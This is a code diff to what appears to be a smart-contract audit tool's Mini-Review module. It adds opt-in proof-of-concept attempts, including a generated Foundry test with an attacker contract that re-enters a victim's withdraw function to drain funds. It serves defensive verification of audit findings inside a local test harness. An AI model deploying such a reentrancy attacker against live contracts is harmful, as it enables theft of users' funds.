@@ -37,20 +37,27 @@ item appears in exactly one of them:
   Unverified, and code-supported items whose severity is not
   Critical (they cannot be Confirmed findings under the rule above).
 
-PoC wiring status (Fix 2, honest limit): ``proof_generator.py``
-generates a PoC only via an LLM call and executes it only via Docker
-or a local ``forge`` toolchain, and its project builder does not
-install ``forge-std`` (which every generated PoC imports). None of
-that is run automatically by Mini-Review: in this VM neither
-``docker`` nor ``forge`` exists, so an automatic attempt cannot
-succeed here. Mini-Review therefore records PoC results only when
-the caller supplies a structured ``poc_result`` (recorded verbatim),
-or when the caller explicitly passes ``attempt_poc=True`` with a
-``poc_path`` -- in which case ``attempt_poc()`` returns
-"could-not-run" rather than inventing a pass when the toolchain is
-absent. Automatic, per-Confirmed-finding PoC generation + execution
-inside Mini-Review is an explicit follow-up, not a claim of this
-change.
+PoC wiring status (automatic attempts, opt-in): with
+``attempt_poc=True``, Mini-Review attempts a PoC for each finding
+without a supplied ``poc_result``: supplied ``poc_path`` files are
+executed via ``attempt_poc()`` as before; reentrancy findings
+without one get a non-LLM template PoC from
+``_template_poc_for_finding`` (deposit + withdraw ``.call`` shape
+only — see that function for the exact covered shape and every
+decline reason); non-reentrancy findings without one are recorded
+could-not-run with reason "no PoC supplied". Attempts stay opt-in,
+not default, so reports that do not ask for them still say
+"not attempted" rather than "could-not-run". ``proof_generator.py``
+now provides ``forge-std`` into the PoC project (FORGE_STD_PATH,
+repo ``lib/forge-std``, ``~/.forge-std``, or ``forge install`` on
+the host before any Docker run); without a forge-std source the run
+is INCONCLUSIVE, never a pass or a disproof. LLM PoC generation
+(``proof_generator.generate_poc``) is still never called by
+Mini-Review, and a could-not-run result never downgrades a
+Confirmed finding while a failed (DISPROVED) result does. In this
+VM neither ``docker`` nor ``forge`` is on PATH, so an attempt here
+returns could-not-run; real execution must be verified where a
+toolchain exists (CI runners have both).
 
 No detector verdict is changed here. This module only triages and
 formats findings that are supplied by the caller, or, when no findings
@@ -65,6 +72,7 @@ import argparse
 import json
 import re
 import shutil
+import tempfile
 from pathlib import Path
 
 import cvss_scorer as _cvss
@@ -183,6 +191,201 @@ def attempt_poc(poc_path, victim_code="", use_docker=True):
     if status in _POC_FAILED:
         return {"status": "failed", "output": str(detail)}
     return {"status": "could-not-run", "output": str(detail)}
+
+
+def _function_name_for_finding(finding: dict):
+    """Vulnerable function name from a finding, or None.
+
+    Auto findings carry it as "Reentrancy in withdraw():"; supplied
+    findings may carry an explicit "function" field. Nothing is
+    guessed from a bare vulnerability name: a template built for the
+    wrong function would be a false PoC, not a proof.
+    """
+    if finding.get("function"):
+        return str(finding["function"])
+    m = re.search(
+        r"\bin\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(",
+        str(finding.get("description", "") or ""),
+    )
+    return m.group(1) if m else None
+
+
+def _template_poc_for_finding(source: str, finding: dict):
+    """Build a template Foundry PoC for one reentrancy finding.
+
+    Returns (poc_text, reason); reason is "" on success and a
+    human-readable decline reason otherwise. A decline is never a
+    PoC: the caller must record could-not-run with the reason.
+
+    Covered shape, exactly (anything else declines):
+    - single-contract victim targeting solc 0.8 (a pre-0.8 pragma
+      declines: the template and the 0.8.25 project solc cannot
+      compile a 0.4/0.5/0.6/0.7 victim);
+    - victim deployable with no constructor arguments;
+    - an unguarded public/external vulnerable function with no
+      arguments, or one uint amount argument;
+    - that function contains a callback-capable ETH ``.call`` to
+      ``msg.sender`` (``.call{value:}`` or old ``.call.value()()``)
+      followed by a write to a contract state variable. ``send`` and
+      ``transfer`` are NOT covered: triage itself does not count
+      them as callback-capable, and their 2300-gas stipend cannot
+      carry a state-changing re-entry;
+    - a zero-argument payable function in the same contract that
+      credits ``msg.sender``'s mapping balance by ``msg.value``
+      (the deposit that funds the attacker).
+
+    The template proves a drain, not a callback count alone: the
+    attacker deposits 1 ether, withdraws it, re-enters up to three
+    more times, and the test asserts the attacker ends with at least
+    2 ether and at least one reentrant callback. If a covered-shape
+    victim's drain does not reproduce (the attack reverts, or the
+    gain stays at the deposit), the test fails and the run maps to
+    DISPROVED, not PROVED. A CEI-fixed victim is not reached by this
+    template at all: it has no call-before-write, so the builder
+    declines it — and triage does not confirm it either — rather
+    than executing a PoC against it. The template uses only
+    ``vm.deal`` and assertions — no dangerous cheatcodes (no ffi,
+    broadcast, or file access).
+    """
+    text = source or ""
+    masked = _mask_solidity_comments_and_strings(text)
+    contract_m = re.search(
+        r"\bcontract\s+([A-Za-z_][A-Za-z0-9_]*)\s*(?:is\s+[^{]+)?\{", masked
+    )
+    if not contract_m:
+        return None, "no contract declaration found in source"
+    victim = contract_m.group(1)
+    pragma_m = re.search(r"pragma\s+solidity\s+([^;]+);", text)
+    if pragma_m:
+        versions = [int(v) for v in re.findall(r"0\.(\d+)", pragma_m.group(1))]
+        if versions and max(versions) < 8:
+            return (
+                None,
+                f"victim targets solc 0.{max(versions)} (<0.8); "
+                "template targets solc 0.8",
+            )
+    ctor_m = re.search(r"\bconstructor\s*\(([^)]*)\)", masked)
+    if ctor_m and ctor_m.group(1).strip():
+        return None, "victim constructor requires arguments; template cannot deploy it"
+    func_name = _function_name_for_finding(finding)
+    if not func_name:
+        return None, "no vulnerable function identified in finding"
+    functions = _gate._parse_code_functions(text)
+    func = functions.get(func_name)
+    if func is None:
+        return None, f"vulnerable function '{func_name}' not found in source"
+    if not func.get("is_public"):
+        return None, f"vulnerable function '{func_name}' is not public/external"
+    if _is_guarded(_modifiers_from_suffix(func.get("suffix", ""))):
+        return None, f"vulnerable function '{func_name}' is guarded; template does not cover guarded functions"
+    body = func.get("body", "")
+    call_m = re.search(r"msg\.sender\s*\.call\s*(\{\s*value\s*:|\.value\s*\()", body)
+    if not call_m:
+        return (
+            None,
+            "no callback-capable ETH .call to msg.sender in function body "
+            "(send/transfer are not callback-capable)",
+        )
+    state_vars = _state_variables(text)
+    tail = body[call_m.end():]
+    write_found = any(
+        m.group(1) in state_vars
+        for m in re.finditer(
+            r"\b([A-Za-z_][A-Za-z0-9_]*)\b\s*(?:\[[^\]]*\]\s*)?(?:\+=|-=|=)(?![=])",
+            tail,
+        )
+    )
+    if not write_found:
+        return None, "no state write after the external call in function body"
+    deposit = None
+    for dname, dinfo in functions.items():
+        if (
+            dinfo.get("is_public")
+            and "payable" in (dinfo.get("suffix", "") or "")
+            and (dinfo.get("params", "") or "").strip() == ""
+            and re.search(
+                r"\b[A-Za-z_][A-Za-z0-9_]*\[msg\.sender\]\s*\+=\s*[^;]*msg\.value",
+                dinfo.get("body", "") or "",
+            )
+        ):
+            deposit = dname
+            break
+    if deposit is None:
+        return (
+            None,
+            "no zero-argument payable deposit function crediting "
+            "msg.sender's balance by msg.value; template cannot fund "
+            "the attacker",
+        )
+    params = (func.get("params", "") or "").strip()
+    if params == "":
+        withdraw_call = f"victim.{func_name}()"
+    elif len(params.split(",")) == 1 and re.search(r"\bu?int\d*\b", params):
+        withdraw_call = f"victim.{func_name}(amount)"
+    else:
+        return (
+            None,
+            "vulnerable function signature not covered (expected no "
+            "arguments or one uint amount)",
+        )
+    poc = f"""// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/Victim.sol";
+
+// Template PoC (no LLM): proves a deposit+withdraw reentrancy drain.
+// Covered shape only -- see mini_review._template_poc_for_finding.
+// It asserts a drain (attacker ends with >= 2 ether from a 1 ether
+// deposit, with at least one reentrant callback), never a callback
+// count alone, so a fixed (CEI) victim fails this test.
+contract MiniReviewAttacker {{
+    {victim} public victim;
+    uint256 public reentries;
+    uint256 public amount;
+    uint256 public maxReentries = 3;
+
+    constructor(address _victim) {{
+        victim = {victim}(payable(_victim));
+    }}
+
+    function depositAndAttack() external payable {{
+        victim.{deposit}{{value: msg.value}}();
+        amount = msg.value;
+        {withdraw_call};
+    }}
+
+    receive() external payable {{
+        if (reentries < maxReentries) {{
+            reentries += 1;
+            {withdraw_call};
+        }}
+    }}
+
+    fallback() external payable {{
+        if (reentries < maxReentries) {{
+            reentries += 1;
+            {withdraw_call};
+        }}
+    }}
+}}
+
+contract MiniReviewPoCTest is Test {{
+    {victim} public victim;
+    MiniReviewAttacker public attacker;
+
+    function testPoCReentrancy() public {{
+        victim = new {victim}();
+        attacker = new MiniReviewAttacker(address(victim));
+        vm.deal(address(victim), 10 ether);
+        vm.deal(address(this), 1 ether);
+        attacker.depositAndAttack{{value: 1 ether}}();
+        assertGe(address(attacker).balance, 2 ether, "attacker did not drain more than deposited");
+        assertGe(attacker.reentries(), 1, "no reentrant callback occurred");
+    }}
+}}
+"""
+    return poc, ""
 
 
 def _is_reentrancy_finding(name: str, description: str) -> bool:
@@ -775,6 +978,7 @@ def generate_mini_review(
     validation_failed=False,
     attempt_poc=False,
     poc_results=None,
+    poc_use_docker=True,
 ):
     """Generate one clean Markdown Mini-Review report.
 
@@ -787,12 +991,27 @@ def generate_mini_review(
     ``poc_results`` is an optional list, aligned with ``findings`` by
     index, of structured poc_result dicts (see _normalize_poc_result);
     a finding may also carry its own "poc_result" dict. A result is
-    recorded verbatim in the report. ``attempt_poc`` (opt-in only)
-    attempts a PoC for each finding that carries a "poc_path", via
-    attempt_poc(); a missing toolchain yields "could-not-run", never
-    an invented pass. Neither option runs PoC generation: generating
-    a PoC needs an LLM (proof_generator.generate_poc), which
-    Mini-Review deliberately does not call.
+    recorded verbatim in the report. ``poc_use_docker`` (default
+    True) selects Docker-isolated execution for attempts; a finding
+    may override it per finding with its own "poc_use_docker" field,
+    and the CLI ``--poc-local`` flag selects local forge instead.
+    Docker is tried first by default and never silently falls back
+    to local execution: a missing Docker binary records
+    could-not-run, exactly as a supplied poc_path attempt does.
+    ``attempt_poc`` (opt-in only,
+    deliberately NOT the default: with no toolchain or no template
+    available an attempt records "could-not-run", which would change
+    reports that currently say "not attempted") attempts a PoC per
+    finding: a finding with a "poc_path" is executed via attempt_poc()
+    as before; a reentrancy finding without one gets a non-LLM
+    template PoC built by _template_poc_for_finding (or a
+    could-not-run result naming the uncovered shape); a
+    non-reentrancy finding without a poc_path gets could-not-run
+    with reason "no PoC supplied", because it still needs a
+    human-supplied PoC or a verified poc_result to be Confirmed.
+    A missing toolchain yields "could-not-run", never an invented
+    pass. LLM PoC generation (proof_generator.generate_poc) is never
+    called: Mini-Review stays LLM-free.
     """
     source = source or ""
     file_label = file_path or "Not provided"
@@ -808,11 +1027,69 @@ def generate_mini_review(
         # so reach the function via globals() explicitly.
         _attempt = globals()["attempt_poc"]
         for raw in raw_findings:
-            if raw.get("poc_path") and not raw.get("poc_result"):
+            if raw.get("poc_result"):
+                continue
+            if raw.get("poc_path"):
                 raw["poc_result"] = _attempt(
                     raw["poc_path"], victim_code=source,
-                    use_docker=raw.get("poc_use_docker", True),
+                    use_docker=raw.get("poc_use_docker", poc_use_docker),
                 )
+            elif _is_reentrancy_finding(
+                str(raw.get("name", "") or ""),
+                str(raw.get("description", "") or ""),
+            ):
+                # Non-LLM template attempt for reentrancy findings
+                # without a supplied PoC. A declined template is
+                # recorded as could-not-run with its reason, never
+                # as a pass and never as a disproof. Any failure
+                # inside the attempt itself is also could-not-run:
+                # a PoC attempt must never crash the report.
+                try:
+                    poc_text, reason = _template_poc_for_finding(source, raw)
+                    if poc_text is None:
+                        raw["poc_result"] = {
+                            "status": "could-not-run",
+                            "error": (
+                                "no PoC template for this finding shape: "
+                                + reason
+                            ),
+                        }
+                    else:
+                        tmp = tempfile.NamedTemporaryFile(
+                            prefix="minireview_poc_", suffix=".t.sol",
+                            mode="w", encoding="utf-8", delete=False,
+                        )
+                        try:
+                            tmp.write(poc_text)
+                            tmp.close()
+                            raw["poc_result"] = _attempt(
+                                tmp.name, victim_code=source,
+                                use_docker=raw.get("poc_use_docker", poc_use_docker),
+                            )
+                        finally:
+                            Path(tmp.name).unlink(missing_ok=True)
+                except Exception as exc:  # fail closed, never a pass
+                    raw["poc_result"] = {
+                        "status": "could-not-run",
+                        "error": (
+                            "template PoC attempt failed: "
+                            f"{type(exc).__name__}: {exc}"
+                        ),
+                    }
+            else:
+                # Non-reentrancy without a supplied PoC: there is no
+                # template for it, and inventing one would be worse
+                # than recording that none was supplied. Its bucket
+                # is unchanged (still an unverified hypothesis until
+                # a verified PoC arrives).
+                raw["poc_result"] = {
+                    "status": "could-not-run",
+                    "error": (
+                        "no PoC supplied; a non-reentrancy Confirmed "
+                        "finding requires a human-supplied poc_path "
+                        "or a verified poc_result"
+                    ),
+                }
 
     # Fail closed (PR #35): a validation failure is a banner on the
     # whole report, never a clean report with unvalidated findings.
@@ -980,18 +1257,26 @@ def generate_mini_review(
         "LLM hypothesis or a guard note in the appendix, never a "
         "finding. A fallback CVSS score is never presented as "
         "official, and a validation failure marks the whole report "
-        "UNVERIFIED. PoC wiring: Mini-Review does not generate PoCs "
-        "(proof_generator generation needs an LLM) and does not run "
-        "PoCs automatically (execution needs Docker or forge, and "
-        "neither was available in this VM at Fix 2 time; the PoC "
-        "project builder also does not install forge-std, which "
-        "generated PoCs import). PoC results appear in this report "
-        "only when supplied as a structured poc_result or via an "
-        "explicit attempt_poc run, and are recorded verbatim as "
-        "passed, failed, or could-not-run, never invented. This "
-        "Mini-Review covers only the file and commit in Scope above; "
-        "it is not a full audit, not a formal verification, and not a "
-        "guarantee of security."
+        "UNVERIFIED. PoC wiring: Mini-Review never calls LLM PoC "
+        "generation. With attempt_poc=True (opt-in, not default) it "
+        "attempts a PoC per finding: a supplied poc_path is executed; "
+        "a reentrancy finding without one gets a non-LLM template "
+        "PoC for the deposit + withdraw .call shape only (other "
+        "shapes are recorded could-not-run with the uncovered-shape "
+        "reason, never faked); a non-reentrancy finding without one "
+        "is recorded could-not-run with reason 'no PoC supplied'. "
+        "The PoC project builder provides forge-std (FORGE_STD_PATH, "
+        "repo lib/forge-std, ~/.forge-std, or host-side forge "
+        "install before any Docker run); without a forge-std source "
+        "a run is INCONCLUSIVE. PoC results are recorded verbatim "
+        "as passed, failed, or could-not-run, never invented: a "
+        "failed result downgrades a reentrancy Confirmed finding, "
+        "while could-not-run does not downgrade it. Without "
+        "attempt_poc=True, PoC results appear only when supplied "
+        "as a structured poc_result, and a finding otherwise says "
+        "'not attempted'. This Mini-Review covers only the file and "
+        "commit in Scope above; it is not a full audit, not a "
+        "formal verification, and not a guarantee of security."
     )
     return "\n".join(lines).rstrip() + "\n"
 
@@ -1004,6 +1289,7 @@ def generate_mini_review_from_file(
     validation_failed=False,
     attempt_poc=False,
     poc_results=None,
+    poc_use_docker=True,
 ):
     """Read one Solidity file and generate its Mini-Review report."""
     text = Path(path).read_text(encoding="utf-8", errors="replace")
@@ -1015,6 +1301,7 @@ def generate_mini_review_from_file(
         validation_failed=validation_failed,
         attempt_poc=attempt_poc,
         poc_results=poc_results,
+        poc_use_docker=poc_use_docker,
     )
 
 
@@ -1025,7 +1312,8 @@ def main(argv=None):
     parser.add_argument("--commit", default=None, help="Frozen commit hash (required for a client report; recorded verbatim)")
     parser.add_argument("--findings-json", default=None, help="JSON list of finding dicts; when omitted, only reentrancy-evidence findings are generated")
     parser.add_argument("--validation-failed", action="store_true", help="Force the UNVERIFIED banner")
-    parser.add_argument("--attempt-poc", action="store_true", help="Attempt a PoC for each finding carrying a poc_path (opt-in; missing toolchain yields could-not-run, never a pass)")
+    parser.add_argument("--attempt-poc", action="store_true", help="Attempt a PoC per finding (opt-in): supplied poc_path files are executed, reentrancy findings without one get a non-LLM template PoC where the shape is covered, others record could-not-run, never a pass)")
+    parser.add_argument("--poc-local", action="store_true", help="Run PoC attempts with local forge instead of Docker-isolated execution (Docker stays the default; no silent fallback either way)")
     args = parser.parse_args(argv)
     findings = None
     if args.findings_json:
@@ -1037,6 +1325,7 @@ def main(argv=None):
             findings=findings,
             validation_failed=args.validation_failed,
             attempt_poc=args.attempt_poc,
+            poc_use_docker=not args.poc_local,
         )
     )
     return 0
